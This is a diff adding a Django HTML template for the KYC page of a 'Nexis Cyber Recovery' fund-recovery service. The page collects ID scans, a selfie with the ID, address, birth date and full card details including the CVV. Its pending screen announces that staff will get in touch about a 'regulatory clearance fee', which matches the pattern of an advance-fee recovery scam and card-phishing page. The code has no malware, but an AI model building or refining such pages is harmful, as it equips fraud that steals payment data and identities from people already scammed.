@@ -1,0 +1,483 @@
+{% extends 'base.html' %}
+{% load static %}
+
+{% block title %}KYC Identity Verification - Nexis Cyber Recovery{% endblock %}
+
+{% block content %}
+<div class="container py-4 py-lg-5">
+    <div class="row g-4">
+        
+        <!-- Master Unified Sidebar -->
+        {% include 'accounts/sidebar.html' with active_page='kyc' %}
+
+        <!-- Main Content Area (Standard col-lg-9) -->
+        <div class="col-lg-9">
+
+            <!-- ===================== NOTICE SCREEN: PENDING ADMIN REVIEW & CHARGES NOTICE ===================== -->
+            {% if kyc.status == 'PENDING' %}
+            <div class="card border-0 shadow-sm rounded-4 mb-4">
+                <div class="card-body p-4 p-md-5">
+                    <div class="text-center mb-4">
+                        <div class="d-inline-flex align-items-center justify-content-center rounded-circle bg-warning-subtle text-warning-emphasis p-4 mb-3" style="width: 80px; height: 80px;">
+                            <i class="fas fa-clock fa-2x"></i>
+                        </div>
+                        <h3 class="fw-bold text-navy mb-1">KYC Application Submitted &amp; Under Compliance Review</h3>
+                        <p class="text-muted">Application Reference: <span class="badge bg-secondary-subtle text-secondary px-3 py-1 font-monospace fw-bold">{{ kyc.application_id }}</span></p>
+                    </div>
+
+                    <!-- Mandatory Charges Required Notice (Email or Phone Number) -->
+                    <div class="alert alert-warning border border-warning-subtle rounded-4 p-4 mb-4 shadow-sm" style="background-color: #fffbeb;">
+                        <div class="d-flex align-items-start gap-3">
+                            <div class="bg-warning text-dark rounded-circle p-3 d-flex align-items-center justify-content-center flex-shrink-0" style="width: 48px; height: 48px;">
+                                <i class="fas fa-file-invoice-dollar fa-lg"></i>
+                            </div>
+                            <div>
+                                <h5 class="fw-bold text-dark mb-2">Important: Regulatory KYC Verification &amp; Clearance Charges</h5>
+                                <p class="text-dark opacity-90 mb-2">
+                                    {{ kyc.charge_notice|default:"In accordance with international anti-money laundering (AML) and financial regulatory guidelines, a statutory KYC forensic verification and regulatory clearance fee is required to complete authentication." }}
+                                </p>
+                                <div class="p-3 bg-white bg-opacity-75 rounded-3 border border-warning-subtle mt-3">
+                                    <div class="d-flex align-items-center gap-2 text-dark fw-bold mb-1">
+                                        <i class="fas fa-user-tie text-warning"></i> Administration Contact Notice
+                                    </div>
+                                    <p class="small text-dark mb-0">
+                                        Our compliance administration team will review your identity credentials and <strong>will contact you directly via your registered email (<span class="text-navy fw-semibold">{{ request.user.email }}</span>) or phone number (<span class="text-navy fw-semibold">{{ profile.phone|default:'provided on file' }}</span>)</strong> regarding the applicable verification charges, clearance fee, and settlement release instructions.
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Lock Notice -->
+                    <div class="alert alert-info border border-info-subtle rounded-4 p-3 mb-4 d-flex align-items-center gap-3">
+                        <i class="fas fa-lock fa-2x text-info flex-shrink-0"></i>
+                        <div class="small">
+                            <strong>Submission Locked:</strong> You cannot re-submit or edit your KYC application while under review. You will be permitted to resubmit only if an administrator requests updates or rejects the submission.
+                        </div>
+                    </div>
+
+                    <!-- Summary of Locked Application Details -->
+                    <div class="card bg-light border-0 rounded-3 mb-4">
+                        <div class="card-body p-4">
+                            <h6 class="fw-bold text-navy mb-3"><i class="fas fa-shield-alt me-2 text-primary"></i>Submitted Verification Records (Locked)</h6>
+                            <div class="row g-3 small">
+                                <div class="col-sm-6 col-md-3">
+                                    <span class="text-muted d-block">Document Type</span>
+                                    <strong class="text-navy">{{ kyc.get_document_type_display }}</strong>
+                                </div>
+                                <div class="col-sm-6 col-md-3">
+                                    <span class="text-muted d-block">Document / ID Number</span>
+                                    <strong class="text-navy">{{ kyc.document_number|default:"Uploaded on file" }}</strong>
+                                </div>
+                                <div class="col-sm-6 col-md-3">
+                                    <span class="text-muted d-block">Registered Card</span>
+                                    <strong class="text-navy">
+                                        {% if kyc.credit_card %}
+                                        {{ kyc.credit_card.card_type }} •••• {{ kyc.credit_card.last_four }}
+                                        {% else %}
+                                        Saved on File
+                                        {% endif %}
+                                    </strong>
+                                </div>
+                                <div class="col-sm-6 col-md-3">
+                                    <span class="text-muted d-block">Submission Timestamp</span>
+                                    <strong class="text-navy">{{ kyc.submitted_at|date:"M d, Y - H:i" }}</strong>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ===================== NOTICE SCREEN: APPROVED ===================== -->
+            {% elif kyc.status == 'APPROVED' %}
+            <div class="card border-0 shadow-sm rounded-4 mb-4">
+                <div class="card-body p-4 p-md-5 text-center">
+                    <div class="d-inline-flex align-items-center justify-content-center rounded-circle bg-success-subtle text-success p-4 mb-3" style="width: 80px; height: 80px;">
+                        <i class="fas fa-check-double fa-2x"></i>
+                    </div>
+                    <h3 class="fw-bold text-navy mb-2">KYC Identity Verified &amp; Approved</h3>
+                    <p class="text-muted mx-auto" style="max-width: 600px;">
+                        Congratulations! Your identity credentials, regulatory clearance, and settlement payment card have been certified by Nexis Cyber Recovery compliance officers. Your account is fully unlocked for all recovery transactions.
+                    </p>
+                    <div class="d-flex justify-content-center gap-3 mt-4">
+                        <a href="{% url 'dashboard' %}" class="btn btn-primary rounded-pill px-4 fw-semibold" style="background-color: #0052cc;">
+                            <i class="fas fa-th-large me-1"></i> Go to Dashboard
+                        </a>
+                        <a href="{% url 'submit_claim' %}" class="btn btn-outline-navy rounded-pill px-4 fw-semibold">
+                            <i class="fas fa-file-invoice-dollar me-1"></i> File Recovery Claim
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ===================== STEP 1: WELCOME, EXPLANATION & TERMS AND CONDITIONS ===================== -->
+            {% elif not kyc.terms_accepted %}
+            <div class="card border-0 shadow-sm rounded-4 mb-4">
+                <div class="card-body p-4 p-md-5">
+                    <!-- Welcome Header -->
+                    <div class="border-bottom pb-4 mb-4">
+                        <div class="d-flex align-items-center gap-3 mb-2">
+                            <div class="rounded-circle bg-primary bg-opacity-10 text-primary p-3 d-flex align-items-center justify-content-center" style="width: 54px; height: 54px;">
+                                <i class="fas fa-shield-alt fa-lg"></i>
+                            </div>
+                            <div>
+                                <h3 class="fw-bold text-navy mb-1">Welcome to Identity Verification (KYC)</h3>
+                                <p class="text-muted mb-0 small">Please review the compliance explanation and accept the verification terms to proceed.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Explanation: Why KYC is Necessary -->
+                    <div class="mb-4">
+                        <h5 class="fw-bold text-navy mb-3"><i class="fas fa-info-circle text-primary me-2"></i>Why is Identity Verification (KYC) Required?</h5>
+                        <p class="text-secondary">
+                            At <strong>Nexis Cyber Recovery</strong>, we specialize in high-stakes forensic investigation, international chargebacks, and legal asset restitution. To ensure strict compliance with international banking regulations and safeguard all parties, completing our Know Your Customer (KYC) process is mandatory before initiating any transactions or lodging recovery claims.
+                        </p>
+                        
+                        <div class="row g-3 mt-2">
+                            <div class="col-md-6">
+                                <div class="p-3 bg-light rounded-3 h-100 border border-slate-100">
+                                    <div class="fw-bold text-navy mb-1"><i class="fas fa-balance-scale text-primary me-2"></i>International AML &amp; CFT Compliance</div>
+                                    <p class="small text-muted mb-0">Under global financial protocols (FATF, FinCEN, EU 5th AMLD), fund recovery agencies must verify the legal identity of claimants to prevent fraudulent money laundering and illegal cross-border disbursements.</p>
+                                </div>
+                            </div>
+                            <div class="col-md-6">
+                                <div class="p-3 bg-light rounded-3 h-100 border border-slate-100">
+                                    <div class="fw-bold text-navy mb-1"><i class="fas fa-user-lock text-primary me-2"></i>Claimant Protection &amp; Safe Payouts</div>
+                                    <p class="small text-muted mb-0">KYC verification ensures that recovered funds, settlement payouts, and card chargebacks are disbursed solely to the verified, rightful claimant, eliminating synthetic identity theft.</p>
+                                </div>
+                            </div>
+                            <div class="col-md-6">
+                                <div class="p-3 bg-light rounded-3 h-100 border border-slate-100">
+                                    <div class="fw-bold text-navy mb-1"><i class="fas fa-university text-primary me-2"></i>Card &amp; Bank Dispute Standing</div>
+                                    <p class="small text-muted mb-0">When filing formal chargebacks under Visa Core Rules or Mastercard Chargeback Guide, acquiring banks demand certified proof of claimant identity and verified payment card ownership.</p>
+                                </div>
+                            </div>
+                            <div class="col-md-6">
+                                <div class="p-3 bg-light rounded-3 h-100 border border-slate-100">
+                                    <div class="fw-bold text-navy mb-1"><i class="fas fa-file-contract text-primary me-2"></i>Enforceable Evidence Records</div>
+                                    <p class="small text-muted mb-0">Verified identity files provide legal standing required by financial ombudsmen and regulatory arbiters to order swift merchant restitution.</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Terms & Conditions Box -->
+                    <div class="mb-4">
+                        <h5 class="fw-bold text-navy mb-2"><i class="fas fa-file-signature text-primary me-2"></i>KYC Verification Terms &amp; Conditions</h5>
+                        <div class="p-3 rounded-3 border bg-white" style="font-size: 0.88rem; line-height: 1.6; color: #4b5563;">
+                            <p class="fw-bold mb-1 text-navy">1. Accuracy and Authenticity of Information</p>
+                            <p class="mb-3">You hereby attest under penalty of perjury that all documents, identity credentials, residential addresses, and credit or debit card details submitted during this verification procedure are genuine, authentic, current, and legally belong to you.</p>
+
+                            <p class="fw-bold mb-1 text-navy">2. Anti-Money Laundering (AML) &amp; Fraud Prevention</p>
+                            <p class="mb-3">Nexis Cyber Recovery reserves the right to conduct electronic cross-referencing against global sanctions lists, PEP databases, and international fraud registries. Any fraudulent or counterfeit documentation will result in immediate disqualification and regulatory escalation.</p>
+
+                            <p class="fw-bold mb-1 text-navy">3. Payment Card Authorization &amp; Regulatory Fees</p>
+                            <p class="mb-3">You acknowledge that a payment card is registered to verify account ownership and authorize recovery restitution channels. A statutory forensic validation or regulatory clearance fee may apply to finalize verification, as communicated by compliance administration.</p>
+
+                            <p class="fw-bold mb-1 text-navy">4. Data Privacy &amp; 256-Bit Encryption</p>
+                            <p class="mb-0">All identity documents and card numbers are encrypted using AES-256 bank-level encryption and stored in compliant security vaults strictly in accordance with GDPR and international data protection laws.</p>
+                        </div>
+                    </div>
+
+                    <!-- Acceptance Form -->
+                    <form method="post" action="{% url 'kyc_verification' %}">
+                        {% csrf_token %}
+                        <input type="hidden" name="action" value="accept_terms">
+                        
+                        <div class="form-check p-3 bg-light rounded-3 border mb-4">
+                            <input class="form-check-input ms-0 me-3" type="checkbox" name="terms_accepted" id="termsCheck" required style="cursor: pointer; transform: scale(1.2);">
+                            <label class="form-check-label fw-semibold text-navy cursor-pointer" for="termsCheck" style="font-size: 0.95rem;">
+                                I have read, understood, and accept the Nexis Cyber Recovery KYC Terms and Conditions, Identity Verification Policy, and Consent to Process Identity Records.
+                            </label>
+                        </div>
+
+                        <div class="d-flex justify-content-end">
+                            <button type="submit" class="btn btn-primary rounded-pill px-5 py-2 fw-bold" style="background-color: #0052cc; font-size: 1rem;">
+                                Continue to Verification <i class="fas fa-arrow-right ms-2"></i>
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+
+            <!-- ===================== STEP 2: FULL KYC INFO + CREDIT CARD (MATCHING USER SCREENSHOT) ===================== -->
+            {% else %}
+            
+            {% if kyc.status == 'REJECTED' %}
+            <div class="alert alert-danger border-danger rounded-4 p-3 mb-4 shadow-sm">
+                <div class="d-flex align-items-center gap-3">
+                    <i class="fas fa-exclamation-triangle fa-2x text-danger"></i>
+                    <div>
+                        <h6 class="fw-bold mb-1">Previous Application Update Required</h6>
+                        <p class="mb-0 small">{{ kyc.admin_notes|default:"Your previous submission was not approved. Please ensure clear, valid documents and correct payment details are provided below." }}</p>
+                    </div>
+                </div>
+            </div>
+            {% endif %}
+
+            <div class="card border-0 shadow-sm rounded-4 mb-4">
+                <div class="card-body p-4 p-md-5">
+                    
+                    <form method="post" action="{% url 'kyc_verification' %}" enctype="multipart/form-data" id="kycForm">
+                        {% csrf_token %}
+
+                        <!-- Document Upload Section (Matching Mockup with Front, Back, and Selfie Silhouette) -->
+                        <div class="mb-5">
+                            <div class="d-flex justify-content-between align-items-center mb-3">
+                                <h5 class="fw-bold text-navy mb-0"><i class="fas fa-id-card text-primary me-2"></i>1. Government Identification Document</h5>
+                                <span class="badge bg-light text-muted border small">Government Issued ID</span>
+                            </div>
+
+                            <div class="row g-3 mb-4">
+                                <div class="col-md-4">
+                                    <label class="form-label small fw-bold text-muted">Document Type *</label>
+                                    <select name="document_type" class="form-select py-2" required>
+                                        {% for val, label in form.fields.document_type.choices %}
+                                        <option value="{{ val }}" {% if form.document_type.value == val %}selected{% endif %}>{{ label }}</option>
+                                        {% endfor %}
+                                    </select>
+                                </div>
+                                <div class="col-md-4">
+                                    <label class="form-label small fw-bold text-muted">Document ID / Number *</label>
+                                    <input type="text" name="document_number" class="form-control py-2" placeholder="e.g. A12345678" value="{{ form.document_number.value|default:'' }}" required>
+                                </div>
+                                <div class="col-md-4">
+                                    <label class="form-label small fw-bold text-muted">Document Expiration Date</label>
+                                    <input type="date" name="document_expiry" class="form-control py-2" value="{{ form.document_expiry.value|date:'Y-m-d'|default:'' }}">
+                                </div>
+                            </div>
+
+                            <!-- 3 Upload Dropzones: Front, Back, and Selfie with ID -->
+                            <div class="row g-3">
+                                <!-- Upload Box 1: Front of Document -->
+                                <div class="col-md-4">
+                                    <label class="form-label small fw-bold text-muted">Upload Document Front *</label>
+                                    <div class="upload-dropzone p-4 text-center rounded-3 border-2 border-dashed position-relative d-flex flex-column justify-content-center" style="border: 2px dashed #cbd5e1; background-color: #f8fafc; min-height: 180px; cursor: pointer;">
+                                        <div class="upload-icon mb-2 text-primary" style="font-size: 2.2rem;">
+                                            <i class="fas fa-cloud-upload-alt"></i>
+                                        </div>
+                                        <div class="fw-semibold text-navy mb-1" style="font-size: 0.9rem;">Click to upload or drag &amp; drop</div>
+                                        <div class="text-muted small" style="font-size: 0.78rem;">SVG, PNG, JPG or PDF (max. 2MB)</div>
+                                        <input type="file" name="document_front" id="document_front" class="position-absolute top-0 start-0 w-100 h-100 opacity-0 cursor-pointer" accept="image/*,application/pdf" required onchange="updateUploadLabel(this, 'front-name')">
+                                        <div id="front-name" class="mt-2 text-success fw-bold small"></div>
+                                    </div>
+                                    {% if kyc.document_front %}
+                                    <div class="small text-muted mt-1"><i class="fas fa-check text-success me-1"></i> Current: {{ kyc.document_front.name|slice:":25" }}</div>
+                                    {% endif %}
+                                </div>
+
+                                <!-- Upload Box 2: Back of Document -->
+                                <div class="col-md-4">
+                                    <label class="form-label small fw-bold text-muted">Upload Document Back</label>
+                                    <div class="upload-dropzone p-4 text-center rounded-3 border-2 border-dashed position-relative d-flex flex-column justify-content-center" style="border: 2px dashed #cbd5e1; background-color: #f8fafc; min-height: 180px; cursor: pointer;">
+                                        <div class="upload-icon mb-2 text-primary" style="font-size: 2.2rem;">
+                                            <i class="far fa-id-card"></i>
+                                        </div>
+                                        <div class="fw-semibold text-navy mb-1" style="font-size: 0.9rem;">Click to upload or drag &amp; drop</div>
+                                        <div class="text-muted small" style="font-size: 0.78rem;">SVG, PNG, JPG or PDF (max. 2MB)</div>
+                                        <input type="file" name="document_back" id="document_back" class="position-absolute top-0 start-0 w-100 h-100 opacity-0 cursor-pointer" accept="image/*,application/pdf" onchange="updateUploadLabel(this, 'back-name')">
+                                        <div id="back-name" class="mt-2 text-success fw-bold small"></div>
+                                    </div>
+                                    {% if kyc.document_back %}
+                                    <div class="small text-muted mt-1"><i class="fas fa-check text-success me-1"></i> Current: {{ kyc.document_back.name|slice:":25" }}</div>
+                                    {% endif %}
+                                </div>
+
+                                <!-- Upload Box 3: Facial Portrait / Selfie with ID (Silhouette matching mockup) -->
+                                <div class="col-md-4">
+                                    <label class="form-label small fw-bold text-muted">Selfie with ID / Portrait *</label>
+                                    <div class="upload-dropzone p-4 text-center rounded-3 border-2 border-dashed position-relative d-flex flex-column justify-content-center" style="border: 2px dashed #cbd5e1; background-color: #f8fafc; min-height: 180px; cursor: pointer;">
+                                        <div class="upload-icon mb-2 text-secondary" style="font-size: 2.2rem; color: #64748b;">
+                                            <i class="far fa-user-circle"></i>
+                                        </div>
+                                        <div class="fw-semibold text-navy mb-1" style="font-size: 0.9rem;">Click to upload or drag &amp; drop</div>
+                                        <div class="text-muted small" style="font-size: 0.78rem;">Selfie holding ID photo (max. 2MB)</div>
+                                        <input type="file" name="selfie_photo" id="selfie_photo" class="position-absolute top-0 start-0 w-100 h-100 opacity-0 cursor-pointer" accept="image/*" onchange="updateUploadLabel(this, 'selfie-name')">
+                                        <div id="selfie-name" class="mt-2 text-success fw-bold small"></div>
+                                    </div>
+                                    {% if kyc.selfie_photo %}
+                                    <div class="small text-muted mt-1"><i class="fas fa-check text-success me-1"></i> Current: {{ kyc.selfie_photo.name|slice:":25" }}</div>
+                                    {% endif %}
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Personal & Residential Info -->
+                        <div class="mb-5 pt-4 border-top">
+                            <h5 class="fw-bold text-navy mb-3"><i class="fas fa-map-marker-alt text-primary me-2"></i>2. Personal &amp; Residential Information</h5>
+                            <div class="row g-3">
+                                <div class="col-md-6">
+                                    <label class="form-label small fw-bold text-muted">Full Legal Name</label>
+                                    <input type="text" class="form-control py-2 bg-light" value="{{ request.user.get_full_name|default:request.user.username }}" readonly>
+                                </div>
+                                <div class="col-md-6">
+                                    <label class="form-label small fw-bold text-muted">Registered Email Address</label>
+                                    <input type="email" class="form-control py-2 bg-light" value="{{ request.user.email }}" readonly>
+                                </div>
+                                <div class="col-md-4">
+                                    <label class="form-label small fw-bold text-muted">Contact Phone Number *</label>
+                                    <input type="tel" name="phone_number" class="form-control py-2" placeholder="+1 (555) 000-0000" value="{{ form.phone_number.value|default:profile.phone }}" required>
+                                </div>
+                                <div class="col-md-4">
+                                    <label class="form-label small fw-bold text-muted">Date of Birth *</label>
+                                    <input type="date" name="date_of_birth" class="form-control py-2" value="{{ form.date_of_birth.value|date:'Y-m-d'|default:'' }}" required>
+                                </div>
+                                <div class="col-md-4">
+                                    <label class="form-label small fw-bold text-muted">Gender</label>
+                                    <select name="gender" class="form-select py-2">
+                                        <option value="" {% if not form.gender.value %}selected{% endif %}>Select Gender</option>
+                                        <option value="Male" {% if form.gender.value == 'Male' %}selected{% endif %}>Male</option>
+                                        <option value="Female" {% if form.gender.value == 'Female' %}selected{% endif %}>Female</option>
+                                        <option value="Other" {% if form.gender.value == 'Other' %}selected{% endif %}>Other / Prefer not to say</option>
+                                    </select>
+                                </div>
+                                <div class="col-md-6">
+                                    <label class="form-label small fw-bold text-muted">Country of Residence *</label>
+                                    <select name="country" class="form-select py-2" required>
+                                        <option value="" disabled {% if not form.country.value and not profile.country %}selected{% endif %}>Select Country</option>
+                                        {% for code, name in country_choices %}
+                                        {% if code %}
+                                        <option value="{{ name }}" {% if form.country.value == name or profile.country == name %}selected{% endif %}>{{ name }}</option>
+                                        {% endif %}
+                                        {% endfor %}
+                                    </select>
+                                </div>
+                                <div class="col-md-6">
+                                    <label class="form-label small fw-bold text-muted">Occupation / Source of Funds</label>
+                                    <input type="text" name="occupation" class="form-control py-2" placeholder="e.g. Business Owner, Engineer, Retired" value="{{ form.occupation.value|default:'' }}">
+                                </div>
+                                <div class="col-12">
+                                    <label class="form-label small fw-bold text-muted">Residential Street Address *</label>
+                                    <input type="text" name="address_line" class="form-control py-2" placeholder="Street Address, Apartment or Suite" value="{{ form.address_line.value|default:'' }}" required>
+                                </div>
+                                <div class="col-md-4">
+                                    <label class="form-label small fw-bold text-muted">City *</label>
+                                    <input type="text" name="city" class="form-control py-2" placeholder="City" value="{{ form.city.value|default:'' }}" required>
+                                </div>
+                                <div class="col-md-4">
+                                    <label class="form-label small fw-bold text-muted">State / Province</label>
+                                    <input type="text" name="state" class="form-control py-2" placeholder="State / Province / Region" value="{{ form.state.value|default:'' }}">
+                                </div>
+                                <div class="col-md-4">
+                                    <label class="form-label small fw-bold text-muted">Postal / ZIP Code *</label>
+                                    <input type="text" name="postal_code" class="form-control py-2" placeholder="Postal Code" value="{{ form.postal_code.value|default:'' }}" required>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Credit Card Addition (Per User Request: "and add credit card to the kyc application") -->
+                        <div class="mb-5 pt-4 border-top">
+                            <div class="d-flex justify-content-between align-items-center mb-2">
+                                <h5 class="fw-bold text-navy mb-0"><i class="fas fa-credit-card text-primary me-2"></i>3. Settlement Payment Card Registration</h5>
+                                <span class="badge bg-success-subtle text-success border border-success-subtle px-3 py-1 rounded-pill small">
+                                    <i class="fas fa-lock me-1"></i> PCI-DSS 256-Bit Encrypted
+                                </span>
+                            </div>
+                            <p class="text-muted small mb-3">
+                                A verified credit or debit card is registered to your recovery file for restitution validation and payment clearing.
+                            </p>
+
+                            <div class="row g-3">
+                                <div class="col-12">
+                                    <label class="form-label small fw-bold text-muted">Cardholder Full Legal Name *</label>
+                                    <input type="text" name="cardholder_name" class="form-control py-2" placeholder="Full Name as printed on card" value="{{ form.cardholder_name.value|default:request.user.get_full_name }}" required>
+                                </div>
+                                <div class="col-md-6">
+                                    <label class="form-label small fw-bold text-muted">Credit / Debit Card Number *</label>
+                                    <div class="input-group">
+                                        <span class="input-group-text bg-white border-end-0"><i class="far fa-credit-card text-muted"></i></span>
+                                        <input type="text" name="card_number" id="kyc_card_number" class="form-control py-2 border-start-0" placeholder="0000 0000 0000 0000" maxlength="23" required>
+                                    </div>
+                                </div>
+                                <div class="col-md-3">
+                                    <label class="form-label small fw-bold text-muted">Expiration Date *</label>
+                                    <input type="text" name="card_expiry" id="kyc_card_expiry" class="form-control py-2" placeholder="MM / YY" maxlength="7" required>
+                                </div>
+                                <div class="col-md-3">
+                                    <label class="form-label small fw-bold text-muted">Security Code (CVV) *</label>
+                                    <input type="text" name="card_cvv" id="kyc_card_cvv" class="form-control py-2" placeholder="CVV" maxlength="4" required>
+                                </div>
+                                <div class="col-md-6">
+                                    <label class="form-label small fw-bold text-muted">Card Billing ZIP / Postal Code</label>
+                                    <input type="text" name="card_billing_zip" class="form-control py-2" placeholder="Zip / Postal code">
+                                </div>
+                                <div class="col-md-6 d-flex align-items-center pt-md-4">
+                                    <div class="d-flex align-items-center gap-3 text-muted small">
+                                        <i class="fab fa-cc-visa fa-2x text-primary"></i>
+                                        <i class="fab fa-cc-mastercard fa-2x text-danger"></i>
+                                        <i class="fab fa-cc-amex fa-2x text-info"></i>
+                                        <span>Accepted Card Networks</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Prominent Submit Application Button (Matching Screenshot) -->
+                        <div class="mt-4 pt-2">
+                            <button type="submit" class="btn btn-primary w-100 py-3 fw-bold rounded-3 shadow-sm d-flex align-items-center justify-content-center gap-2" style="background-color: #0052cc; border-color: #0052cc; font-size: 1.05rem;">
+                                <i class="fas fa-check-circle"></i> Submit Application
+                            </button>
+                        </div>
+                    </form>
+
+                </div>
+            </div>
+            {% endif %}
+
+            <!-- Support Box: "Need help with verification?" (Exact Match to User Screenshot) -->
+            <div class="card border-0 shadow-sm rounded-4 p-4 mt-4" style="background-color: #ffffff;">
+                <div class="d-flex flex-column flex-md-row justify-content-between align-items-md-center gap-3">
+                    <div class="d-flex align-items-center gap-3">
+                        <div class="rounded-circle d-flex align-items-center justify-content-center text-white flex-shrink-0" style="width: 56px; height: 56px; background-color: #4c82e6;">
+                            <i class="fas fa-life-ring fa-xl"></i>
+                        </div>
+                        <div>
+                            <h5 class="fw-bold mb-1 text-navy">Need help with verification?</h5>
+                            <p class="text-muted small mb-0">Our support team is available 24/7 to assist you with the verification process. Reach out with any questions.</p>
+                        </div>
+                    </div>
+                    <div>
+                        <a href="{% url 'support' %}" class="btn btn-outline-primary rounded-3 px-4 py-2 fw-semibold d-inline-flex align-items-center gap-2" style="border-color: #0052cc; color: #0052cc;">
+                            <i class="far fa-comment-dots"></i> Contact Support
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+<script>
+function updateUploadLabel(input, targetId) {
+    if (input.files && input.files[0]) {
+        document.getElementById(targetId).textContent = "Selected: " + input.files[0].name;
+    }
+}
+
+// Auto formatting card number with spaces
+const cardInput = document.getElementById('kyc_card_number');
+if (cardInput) {
+    cardInput.addEventListener('input', function(e) {
+        let val = e.target.value.replace(/\D/g, '');
+        let formatted = val.match(/.{1,4}/g)?.join(' ') || '';
+        e.target.value = formatted.substring(0, 23);
+    });
+}
+
+// Auto formatting MM / YY
+const expiryInput = document.getElementById('kyc_card_expiry');
+if (expiryInput) {
+    expiryInput.addEventListener('input', function(e) {
+        let val = e.target.value.replace(/\D/g, '');
+        if (val.length >= 2) {
+            e.target.value = val.substring(0, 2) + ' / ' + val.substring(2, 4);
+        } else {
+            e.target.value = val;
+        }
+    });
+}
+</script>
+{% endblock %}
